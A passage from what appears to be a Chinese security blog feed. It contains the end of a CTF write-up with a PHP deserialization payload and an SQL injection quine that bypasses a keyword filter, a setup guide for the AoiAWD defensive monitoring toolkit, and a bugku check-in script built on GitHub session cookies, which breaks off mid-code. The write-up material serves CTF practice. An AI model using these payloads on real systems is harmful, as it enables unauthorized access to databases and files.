<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pks&#x3D;O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3Bs%3A68%3A%22O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BR%3A3%3B%7D%22%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BR%3A6%3B%7D</span><br></pre></td></tr></table></figure>
<p>右键源码查看flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/pklovecloud/4BZ%609LFD1I6HGF%24C0%5BKTLNG.png" alt=""></p>
<h2 id="yet-another-mysql-injection"><a class="header-anchor" href="#yet-another-mysql-injection">¶</a>yet_another_mysql_injection</h2>
<p><a href="http://114.115.143.25:32770/?source">http://114.115.143.25:32770/?source</a> 可以查看源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params">$mes,$url</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,$s))&#123;</span><br><span class="line">        alertMes(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    $username=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        alertMes(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    checkSql($password);</span><br><span class="line">    $sql=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    $user_result=mysqli_query($con,$sql);</span><br><span class="line">    $row = mysqli_fetch_array($user_result);</span><br><span class="line">    <span class="keyword">if</span> (!$row) &#123;</span><br><span class="line">        alertMes(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($row[<span class="string">&#x27;password&#x27;</span>] === $password) &#123;</span><br><span class="line">    <span class="keyword">die</span>($FLAG);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alertMes(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>很显然需要我们输入的passwors和数据库中的强相等才行，搜了一下资料，Quine可以编写一个返回自身的sql查询<br>
参考链接：<a href="https://www.shysecurity.com/post/20140705-SQLi-Quine">https://www.shysecurity.com/post/20140705-SQLi-Quine</a><br>
使用脚本编写payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/9/18 11:25</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quine</span>(<span class="params">data, debug=True</span>):</span></span><br><span class="line">    <span class="keyword">if</span> debug: print(data)</span><br><span class="line">    data = data.replace(<span class="string">&#x27;@@&#x27;</span>,<span class="string">&quot;REPLACE(REPLACE(@@,CHAR(34),CHAR(39)),CHAR(64),@@)&quot;</span>)</span><br><span class="line">    blob = data.replace(<span class="string">&#x27;@@&#x27;</span>,<span class="string">&#x27;&quot;@&quot;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">    data = data.replace(<span class="string">&#x27;@@&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>+blob+<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> debug: print(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">result = quine(<span class="string">&quot;&#x27;UNION/**/SELECT/**/@@/**/AS/**/atao#&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>运行后得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;UNION&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&#39;&quot;UNION&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;@&quot;,CHAR(34),CHAR(39)),CHAR(64),&quot;@&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;atao#&#39;,CHAR(34),CHAR(39)),CHAR(64),&#39;&quot;UNION&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;@&quot;,CHAR(34),CHAR(39)),CHAR(64),&quot;@&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;atao#&#39;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;atao#</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4wp/yet_another_mysql_injection/3GEZF%29W%28%29%24SB%40V55DL%24%40LUB.png" alt=""></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>AoiAWD-萌新的得分利器</title>
    <url>/posts/16692/</url>
    <content><![CDATA[<h1>前言</h1>
<p>这两天玩了一下bugku的awd模式，因为之前也没有正式玩过，所以本萌新被各位师傅打得惨惨。这里分享一个安恒维护的开源项目AoiAWD，不过搭建可谓是问题连连。昨天一共有10轮，因为使用不当，导致前五轮都在传探针和执行的过程，所以错过了前五轮的机会，后面五轮都在看师傅们打过来的马和流量，去用着师傅们的马去连接别人的拿flag得分…QWQ。等有时间也研究一下批量写马和获取flag的套路。这里贴一下最后的结果图吧，一共50支队伍，最后得了第七名惨惨😫<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/GALX2N9Z%28%7D%28ZN%28I%242F7K3%247.png" alt=""></p>
<h1>项目</h1>
<h2 id="项目说明"><a class="header-anchor" href="#项目说明">¶</a>项目说明</h2>
<p>这里直接贴官方的说明</p>
<blockquote>
<p>在常见的AWD比赛中，选手往往拥有一台（或若干台）开放了SSH服务和题目服务的“靶机”作为自己防守的阵地。</p>
<p>在实际比赛中，主办方往往会限制选手的SSH权限到一般用户/仅可管理题目的权限。并且针对一些常见的通用防火墙脚本（通防脚本）进行轮询式check。</p>
<p>AoiAWD是针对以上场景的限制和痛点设计的，组件间基于socket通信以便灵活部署，具有图形可视化界面。所有行为探针均支持在最低系统权限下运行，且默认不会干扰题目业务逻辑的正常运行，可以绕过绝大部分check脚本的行为检查。支持如下维度的行为捕获能力：</p>
<ul>
<li>Web输入输出数据捕获、输出流量篡改（没错，你可以动态替换掉输出的flag为任意字符串）</li>
<li>PWN类题目输入输出交互流量包捕获、当次运行时内存结构捕获、输出流量篡改</li>
<li>服务器进程UID、PID、父进程、启动参数、运行时间捕获</li>
<li>服务器文件系统新建、删除、修改、权限变化行为捕获。</li>
</ul>
<p>本系统还内置了生命周期钩子，可以针对某一次行为的产生编写特定的插件去实现流量层面的临时热补丁、增加大屏告警、替换输出字符等操作。系统默认内置了如下插件可供参考：</p>
<ul>
<li>FlagBuster: 当检测到输出流量中包含了符合正则的flag字符串，产生大屏告警、标记触发规则的数据包、并将flag精准替换为看起来也像flag的随机数。</li>
<li>KingWatcher: KoH类比赛中，当有其他队伍替换掉了赛点文件时，产生大屏告警。</li>
<li>ZombieKiller: 当文件系统上出现了不死马行为，标记可疑文件并产生大屏告警。</li>
</ul>
</blockquote>
<h3 id="AoiAWD-Core"><a class="header-anchor" href="#AoiAWD-Core">¶</a>AoiAWD Core</h3>
<p>是整个系统运行的核心，负责探针数据收集入库、插件生命周期管理、Web前端托管服务。</p>
<ul>
<li>运行compile.php即可打包为一个单独的二进制文件，方便携带。</li>
<li>插件需要放到和aoiawd.phar同目录下的plugins文件夹，Web端有直接重载插件的按钮，可以实现热更新。</li>
<li>一般情况下可直接无参数运行，如果需要特别的配置，可以增加-h参数查看帮助信息。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AoiAWD: Data Visualization Tool &amp; Main Server</span><br><span class="line">Usage: .&#x2F;aoiawd.phar [OPTIONS]</span><br><span class="line">         -w [URI] HTTP server bind URI. Default: tcp:&#x2F;&#x2F;0.0.0.0:1337</span><br><span class="line">         -l [URI] Log recoard server bind URI. Default: tcp:&#x2F;&#x2F;0.0.0.0:8023</span><br><span class="line">         -m [URI] MongoDB server URI. Default: mongodb:&#x2F;&#x2F;127.0.0.1:27017</span><br><span class="line">         -t [STRING] Access token. Default: [RANDOM]</span><br><span class="line">         -h This help info</span><br></pre></td></tr></table></figure>
<ul>
<li>运行后会显示本次启动后的临时密钥，是访问Web前端的必要信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[2020-09-24 15:21:21] MainServer.notice: AccessToken: 0de8d57b3e91dc66 [] [] #&lt;-- Web访问密钥</span><br><span class="line">...</span><br><span class="line">[2020-09-24 15:21:21] Amp\Http\Server\Server.info: Listening on http:&#x2F;&#x2F;0.0.0.0:1337&#x2F; [] [] #&lt;-- Web前端地址</span><br><span class="line">[2020-09-24 15:21:21] aoicommon\socket\AsyncTCPServer.info: Listening on 0.0.0.0:8023 [] [] #&lt;-- 探针上线地址</span><br></pre></td></tr></table></figure>
<h3 id="Guardian"><a class="header-anchor" href="#Guardian">¶</a>Guardian</h3>
<p>一个二进制PWN的影子外壳，其原理是包裹在PWN题目外侧，在每次被启动的时候透明记录STDIN与STDOUT的流量，并快照PWN程序的内存结构(/proc/???/mem)上传回AoiAWD Core。</p>
<ul>
<li>在项目目录运行compile.php将会编译影子壳程序和捆绑程序: guardian.phar，一般是在选手电脑上进行捆绑后将生成文件上传到靶机。</li>
<li>直接运行捆绑程序会输出帮助文本，其中比较重要的一些参数是:
<ul>
<li>-i: 输入需要套壳的PWN题目程序路径</li>
<li>-s: 输入可以从靶机访问到探针上线地址的URL，比如说192.168.???.???:8023</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Guardian: AoiAWD ELF PWNMonitor Tool</span><br><span class="line">Usage: .&#x2F;guardian.phar [PATH]</span><br><span class="line">         -i [PATH] Original ELF.</span><br><span class="line">         -o [PATH] Path of patched ELF. Default: &#123;$OriginalELF&#125;.guardianed</span><br><span class="line">         -s [URI] Log recoard server URI. Default: 127.0.0.1:8023</span><br><span class="line">         -h This help info</span><br></pre></td></tr></table></figure>
<h3 id="TapeWorm"><a class="header-anchor" href="#TapeWorm">¶</a>TapeWorm</h3>
<p>一个PHP Web的影子外壳，其原理是自动注入到<strong>所有</strong>PHP文件的头部，支持输入输出流量的抓取与上报，同时具有处理输出数据的能力，实现输出内容篡改。</p>
<ul>
<li>程序内部的代码已经实现了单实例启动，即便是层层include了多次，也只会运行最先触发的影子外壳。所以不用担心复杂的题目影响性能。</li>
<li>自动注入程序会智能识别面向对象的文件(包含 namespace 关键字)，和直接面向过程的PHP文件，<strong>一般</strong>情况下不会造成语法错误。</li>
<li>自动注入程序会识别已经被注入的脚本并加以跳过，所以多次反复无脑对web根目录运行注入程序并不会造成什么太大的问题。</li>
<li>运行compile.php就可以生成自动注入程序，一般情况下可以上传到靶机上直接对web根目录进行注入，或者在选手电脑上注入好之后再上传到靶机上。</li>
<li><strong>一时注入一时爽，忘记备份宕机慌</strong></li>
<li>直接运行注入程序会显示帮助文本，其中比较重要的一些参数是:
<ul>
<li>-d: 需要注入外壳的web根目录，会从此目录递归感染所有的PHP文件。</li>
<li>-s: 输入可以从靶机访问到探针上线地址的URL，比如说192.168.???.???:8023。</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TapeWorm: AoiAWD PHP WebMonitor Tool</span><br><span class="line">Usage: .&#x2F;tapeworm.phar [PATH]</span><br><span class="line">         -d [PATH] WebMonitor inject dir.</span><br><span class="line">         -s [URI] Log recoard server URI. Default: 127.0.0.1:8023</span><br><span class="line">         -f [PATH] Inject file path. Default: &#123;$dir&#125;</span><br><span class="line">         -h This help info</span><br></pre></td></tr></table></figure>
<h3 id="RoundWorm"><a class="header-anchor" href="#RoundWorm">¶</a>RoundWorm</h3>
<p>一个监控文件系统和进程的系统行为监视器，其原理是扫描/proc文件夹获取当前正在运行的所有进程的信息，以及利用Linux系统的inotify功能对指定文件夹的敏感文件操作进行全面的记录。</p>
<ul>
<li>直接运行make就可以编译生成</li>
<li>一般来讲该程序在靶机上运行，选手电脑上没必要执行这玩意。</li>
<li>添加-h参数即可看到帮助文档，其中比较重要的一些参数是:
<ul>
<li>-d: 后台运行，你当然不想关掉ssh的时候就把探针也给关了。</li>
<li>-s: 输入可以从靶机访问到探针上线地址的IP，比如说192.168.???.???。</li>
<li>-w: 需要监控文件变化的路径，如果有多个路径使用’;'分割，比如: -w “/tmp;/var/www/html”</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RoundWorm: AoiAWD Filesystem &amp; Process Monitor Tool</span><br><span class="line">Usage: .&#x2F;roundworm [OPTIONS]</span><br><span class="line">         -d Running in daemon mode.</span><br><span class="line">         -s [HOST] AoiAWD Probe IP. Default: 127.0.0.1</span><br><span class="line">         -p [PORT] AoiAWD Probe PORT. Default: 8023</span><br><span class="line">         -w [PATH] Inotify watch dir, &#39;;&#39; as divider. Default: &#x2F;tmp</span><br><span class="line">         -i [MSECOND] Process watch interval. Default: 100</span><br><span class="line">         -h This help info</span><br></pre></td></tr></table></figure>
<h2 id="搭建流程"><a class="header-anchor" href="#搭建流程">¶</a>搭建流程</h2>
<blockquote>
<p>更新<br>
时间：2021.7.10<br>
之前记录的方法是使用的ubuntu18.04环境，今天搭建的时候遇见了npm版本的问题，遂重新更新一下使用方法，环境基于ubuntu20.04</p>
</blockquote>
<p>这里我使用的是阿里云的ubuntu20.04系统<br>
项目地址：<a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a><br>
首先需要更新一波</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></table></figure>
<p><strong>安装git和下载项目</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install git</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com.cnpmjs.org&#x2F;DasSecurity-HatLab&#x2F;AoiAWD.git</span><br></pre></td></tr></table></figure>
<p><strong>安装inotifywait</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir inotifywait   #新建文件夹</span><br><span class="line">cd inotifywait      #进入文件夹</span><br><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;downloads&#x2F;rvoicilas&#x2F;inotify-tools&#x2F;inotify-tools-3.14.tar.gz   #下载</span><br><span class="line">tar zxf inotify-tools-3.14.tar.gz   #解压</span><br><span class="line">cd inotify-tools-3.14&#x2F;</span><br><span class="line">.&#x2F;configure &amp;&amp; make &amp;&amp; make install #安装</span><br></pre></td></tr></table></figure>
<p>可用<code>man inotifywait</code>命令查看文档以确定是否安装正确，然后按q退出<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/QXB3LNP%7B6%25LVW~Y%60%5DIXGSJ0.png" alt=""><br>
<strong>安装mongdb需要的依赖</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install mongodb-server</span><br><span class="line">sudo apt-get install php7.4-dev php-pear</span><br><span class="line">sudo pecl install mongodb   				#这里下载速度需要等多点时间</span><br></pre></td></tr></table></figure>
<p>如果在sudo pecl install mongodb这一步报错了，换成下面的方式安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &#39;https:&#x2F;&#x2F;pecl.php.net&#x2F;get&#x2F;mongodb-1.9.0.tgz&#39; -o mongodb-1.9.0.tgz  #这里报错ssl错误的话多试几次</span><br><span class="line">pecl install mongodb-1.9.0.tgz</span><br></pre></td></tr></table></figure>
<p>下面分别是这三条命令安装成功的截图：<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/mon_1.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/mon_2.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/mon_3.png" alt=""><br>
如果出现了提示<code>You should add &quot;extension=mongodb.so&quot; to php.ini</code>说明成功了，接着我们去php的配置文件php.ini进行修改<br>
路径一般为:<code>/etc/php/7.4/cli/php.ini</code>，接着我们去拓展处加上<code>extension=mongodb.so</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/3CBP_L%2507KRWPG%40EF96MB0A.png" alt=""><br>
然后再把这两个开关改成Off，记住要把前面的分号去掉，不然会被注释掉<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/7SM9T%60%5BK%29%7D52XNR_%40~1HI6L.png" alt=""><br>
<strong>构建Fronted项目</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install npm      #安装npm</span><br><span class="line">cd AoiAWD  			#进入下载的项目</span><br><span class="line">cd Frontend</span><br><span class="line">npm install          #如有提示可继续敲npm fund命令</span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure>
<p>下面分别是最后两条命令执行成功的截图（后来发现不同环境下会有出入，仅做参考）：<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/Y88%7B7%25NZ%29N0PV8KQIA%406FOB.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/9FNX9%2873_BGGQ%29AJ2X4AC6F.png" alt=""><br>
执行成功会在dist/目录下得到index.html和static目录</p>
<p><strong>构建AoiAWDcore</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd AoiAWD</span><br><span class="line">rm -rf src&#x2F;public&#x2F;*						#删除</span><br><span class="line">cp -r ..&#x2F;Frontend&#x2F;dist&#x2F;* src&#x2F;public&#x2F;	  #复制静态资源</span><br><span class="line">php compile.php</span><br></pre></td></tr></table></figure>
<p>执行成功截图：<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/D%5DS33%60%25S3%28_CZKLE_4XTFH3.png" alt=""><br>
执行成功后得到aoiawd.phar</p>
<p><strong>构建TapeWorm</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd TapeWorm</span><br><span class="line">php compile.php</span><br></pre></td></tr></table></figure>
<p>构建成功后得到tapeworm.phar</p>
<p><strong>构建Guardian</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd Guardian</span><br><span class="line">php compile.php</span><br></pre></td></tr></table></figure>
<p>构建成功后得到guardian.phar</p>
<p><strong>构建RoundWorm</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd RoundWorm</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>构建成功会得到roundworm<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/8A8%24_NC6%7BHMR%5DVZM%24Z%7B4C%409.png" alt=""><br>
<strong>启动AoiAWD</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd AoiAWD</span><br><span class="line">sudo mongod</span><br><span class="line">.&#x2F;aoiawd.phar</span><br></pre></td></tr></table></figure>
<p>执行后：<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/4%7D89%5DOMY%25KLM%60K85%7DX%5D%40N_K.png" alt=""><br>
会提供一个随机token和开放三个端口，1337是web访问端口，8023是探针的接收端口，然后我们通过ip:1337去访问开启的AoiAWD界面<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/PG2FKEM%24%5D%5B6P3BH%5B5IHV270.png" alt=""></p>
<h2 id="使用方法"><a class="header-anchor" href="#使用方法">¶</a>使用方法</h2>
<p>搭建完后把刚刚那些文件夹中的生成的文件例如xxx.phar等发送到提供给我们的靶机上去，然后记得赋予权限，ip是云服务器ip，端口就是默认8023</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x tapeworm.phar</span><br><span class="line">chmod +x roundworm</span><br><span class="line">chmod +x guardian.phar</span><br><span class="line">.&#x2F;tapeworm.phar -d 目录 -s ip:port</span><br><span class="line">.&#x2F;roundworm  -w 目录 -s ip -p port</span><br><span class="line">.&#x2F;guardian.phar -i 目录 -s ip:port</span><br></pre></td></tr></table></figure>
<p>这里贴当时比赛的一些图：<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/Q%28%25%25P14U%7DOJ~%29C5ZO1%24XR0S.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/VMCECNOZK%295W79%6019%60%606U%28G.png" alt=""></p>
]]></content>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku自动签到程序</title>
    <url>/posts/51649/</url>
    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>哈哈，首先写自动签到脚本的初衷还是因为签到有金币可以拿。一开始想法是用卷积神经网络训练模型，然后识别登录页面的验证码，但是当我爬取了1000张验证码后，在标记上面花了我整整一个早上和一个下午的时间<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku%E7%AD%BE%E5%88%B0%E7%A8%8B%E5%BA%8F/YA%25G4S9~O%5DES3FHO2%7DK95XT.png" alt=""><br>
然后结果是训练出来的模型对于训练集识别百分百，但对于测试集识别率不尽人意，猜想可能是数字加大小写字母的组合需要更多的训练集，但是一想到又要花费大量时间标记，就感觉整个人都不好了😭，正好有人说采取github登录的思路，就想着先用github来实现吧惨惨</p>
<h2 id="正文"><a class="header-anchor" href="#正文">¶</a>正文</h2>
<p>思路很简单，就是通过github的cookie去请求登录，登录成功后，通过requests保持session会话去请求打卡地址<br>
使用步骤如下：<br>
首先需要github的cookie（有效时间长得让你难以置信，现在是用了一个月还没失效的博主回来更新这篇文章），这边去抓包一下拿到<code>user_session</code>和<code>__Host-user_session_same_site</code>这两个值是一样的<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku%E7%AD%BE%E5%88%B0%E7%A8%8B%E5%BA%8F/%28%24P_B8AT%295P%5D2E0N_%7D%5B%7BG90.png" alt=""><br>
然后去注册一下server酱，绑定你的微信。然后通过调用server酱，把打卡结果发送到微信上<br>
地址：<a href="https://sc.ftqq.com/3.version">https://sc.ftqq.com/3.version</a><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/bugku%E7%AD%BE%E5%88%B0%E7%A8%8B%E5%BA%8F/NF%7B%24FT4O%5BCGI3R%29P7%5D%5DPA%25U.png" alt=""></p>
<p>源码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># Author：dota_st</span></span><br><span class="line"><span class="comment"># Date ：2021/1/21 17:43</span></span><br><span class="line"><span class="comment"># Tool ：PyCharm</span></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request <span class="keyword">as</span> RR</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> retrying <span class="keyword">import</span> retry</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"><span class="comment">#定义通用的请求头</span></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取txt配置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_txt</span>():</span></span><br><span class="line">    user_list = []</span><br><span class="line">    server_list = []</span><br><span class="line">    git_list = []</span><br><span class="line">    f = open(<span class="string">r&#x27;配置.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        <span class="keyword">if</span> data[i] != <span class="string">r&#x27;******author:dota_st******&#x27;</span>:</span><br><span class="line">            user_line = data[i].split(<span class="string">r&quot;user=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;#&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            server_line = data[i].split(<span class="string">r&quot;server_key=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;#&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            git_line = data[i].split(<span class="string">r&quot;git_cookie=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;#&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            user_list.append(user_line)</span><br><span class="line">            server_list.append(server_line)</span><br><span class="line">            git_list.append(git_line)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> user_list, server_list, git_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用server酱发送消息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_send</span>(<span class="params">user_line, server_line, message</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;desp&#x27;</span>: message&#125;</span><br><span class="line">    server_key = server_line</span><br><span class="line">    requests.post(<span class="string">&quot;https://sc.ftqq.com/&quot;</span>+server_key+<span class="string">&quot;.send?text=尊贵的&quot;</span>+user_line+<span class="string">&quot;用户bugku自动签到脚本结果&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取签到结果返回信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_result</span>(<span class="params">user_line, server_line, bug_cookie</span>):</span></span><br><span class="line">    <span class="keyword">global</span> headers</span><br><span class="line">    headers[<span class="string">&#x27;X-Requested-With&#x27;</span>] = <span class="string">&quot;XMLHttpRequest&quot;</span></span><br><span class="line">    headers[<span class="string">&#x27;cookie&#x27;</span>] = bug_cookie</span><br><span class="line">    req = RR.Request(url=<span class="string">&#x27;https://ctf.bugku.com/user/checkin&#x27;</span>, headers=headers)  <span class="comment"># 这样就能把参数带过去了</span></span><br><span class="line">    <span class="comment"># 下面是获得响应</span></span><br><span class="line">    <span class="keyword">with</span> RR.urlopen(req) <span class="keyword">as</span> f:</span><br><span class="line">        Data = f.read()</span><br><span class="line">        data = json.loads(Data)</span><br><span class="line">        print(data[<span class="string">&#x27;msg&#x27;</span>])</span><br><span class="line">        server_send(user_line, server_line, data[<span class="string">&#x27;msg&#x27;</span>])</span><br><span class="line"><span class="comment">#登录判断</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 